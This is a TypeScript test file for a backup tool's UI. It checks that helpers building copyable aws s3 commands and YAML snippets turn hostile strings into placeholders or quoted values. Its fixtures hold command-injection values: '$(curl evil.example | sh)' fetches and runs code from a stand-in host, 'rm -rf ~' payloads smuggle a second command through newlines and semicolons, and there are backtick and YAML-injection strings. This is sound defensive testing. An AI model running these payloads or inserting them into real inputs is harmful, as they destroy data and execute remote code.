// A string from the server or the user reaches a command an operator copies only shaped
// and single-quoted, or as a placeholder; and reaches YAML only through the plan builder's
// scalar writer. Each hostile value has its accepted twin as the control.
import { describe, expect, it } from "vitest";
import { hasShape, s3Arg, shellArg, type ShellArgKind } from "./shell";
import { checkCommands, evidenceRoute } from "../pages/backups/verdict";
import { independentCheck } from "../pages/restores/words";
import { trustSnippet } from "../pages/catalog/CatalogDetail";

const HOSTILE = ["kafka\nrm -rf ~", "$(curl evil.example | sh)", "`id`", "bucket;rm -rf ~", "-o/tmp/x", "a b", "it's", "x|sh", "x>~/.bashrc", "x&y"];

const ACCEPTED: Record<ShellArgKind, string> = {
  name: "kafka-backups",
  storageKey: "logweir/backups/orders-hourly/r1.receipt.json",
  url: "https://minio.storage.svc:9000",
  region: "eu-west-1",
};

describe("shellArg", () => {
  it("quotes a value of its kind's shape, and puts a placeholder for a newline, $(…), a backtick, ';' or a leading '-'", () => {
    for (const [kind, good] of Object.entries(ACCEPTED) as [ShellArgKind, string][]) {
      // Control: the plain value of each kind passes, single-quoted.
      expect(shellArg(good, kind)).toBe(`'${good}'`);
      for (const bad of HOSTILE) {
        expect(hasShape(bad, kind)).toBe(false);
        expect(shellArg(bad, kind, "<value>")).toBe("<value>");
      }
    }
    // A leading '-' is refused even where the rest is plain: it would be an option.
    expect(shellArg("-rf", "storageKey")).toBe("<storageKey>");
    expect(shellArg("-west-1", "region")).toBe("<region>");
    // A placeholder is only ever placeholder-shaped.
    expect(shellArg("$(x)", "name", "<$(id)>")).toBe("<name>");
  });

  it("quotes an s3:// argument whole only when both parts have their shape", () => {
    expect(s3Arg("kafka-backups", "logweir/x.json")).toBe("'s3://kafka-backups/logweir/x.json'");
    expect(s3Arg("kafka-backups", "logweir/x.json\nrm -rf ~")).toBe("s3://kafka-backups/<key>");
    expect(s3Arg("b;id", "logweir/x.json")).toBe("s3://<bucket>/logweir/x.json");
    expect(s3Arg("<bucket of destination primary>", "logweir/x.json")).toBe("s3://<bucket of destination primary>/logweir/x.json");
    expect(s3Arg("kafka-backups", "-x")).toBe("s3://kafka-backups/<key>");
  });
});

describe("the commands the pages show", () => {
  it("a backup's check: hostile server strings become placeholders, never shell text", () => {
    const route = { bucket: "kafka-backups", endpoint: "https://x$(id).example", region: "eu-west-1;id" };
    const lines = checkCommands(route, "logweir/r.json`id`", "logweir/r.sig");
    expect(lines[0]).toBe("aws s3 cp s3://kafka-backups/<key> ./receipt.json --endpoint-url <endpoint> --region <region>");
    expect(lines[1]).toBe("aws s3 cp 's3://kafka-backups/logweir/r.sig' ./receipt.sig --endpoint-url <endpoint> --region <region>");
    for (const line of lines) expect(line).not.toMatch(/\$\(|`|;|\n/);
    // A destination name that is not a Kubernetes name never reaches the placeholder.
    const moved = evidenceRoute(
      { destinationRef: { name: "x>; id #" }, locationDigest: "sha256:a" } as never,
      { storage: { bucket: "b" }, locationDigest: "sha256:b" },
      null,
    );
    expect(moved.bucket).toBe("<bucket of the destination>");
  });

  it("a restore's check: the plan's and the operation's strings are shaped the same way", () => {
    const lines = independentCheck("kafka-backups", "logweir/s.json\n; rm -rf ~", "-sig", { endpoint: "http://minio:9000", region: "", pathStyle: true });
    expect(lines[0]).toBe("aws s3 cp s3://kafka-backups/<key> ./scorecard.json --endpoint-url 'http://minio:9000'");
    expect(lines[1]).toBe("aws s3 cp s3://kafka-backups/<key> ./scorecard.sig --endpoint-url 'http://minio:9000'");
  });

  it("the TrustPolicy snippet takes a key id only as one quoted YAML scalar", () => {
    const lines = trustSnippet(["key-1\n      state: Active", "plain-key"]);
    expect(lines).toContain('    - keyId: "key-1\\n      state: Active"');
    // Control: an ordinary id is the same scalar, quoted.
    expect(lines).toContain('    - keyId: "plain-key"');
    expect(lines.filter((l) => l.trim() === "state: Active")).toHaveLength(0);
  });
});
